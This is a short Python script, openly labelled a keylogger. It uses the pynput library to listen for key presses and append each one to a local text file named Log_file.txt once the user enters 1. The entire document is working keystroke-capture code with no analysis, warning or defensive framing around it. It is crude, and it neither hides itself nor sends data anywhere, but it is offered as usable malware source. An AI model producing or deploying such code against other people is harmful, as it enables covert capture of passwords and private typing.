from pynput.keyboard import Listener
a = int(input("Press 1 to start Keylogger: "))
if a == 1:
    def write_file(keystrocks):
        keys = str(keystrocks)
        with open("Log_file.txt",'a') as f:
            f.write(keys)

    with Listener(on_press=write_file) as l:
        k=input("Enter keys ")
        l.join()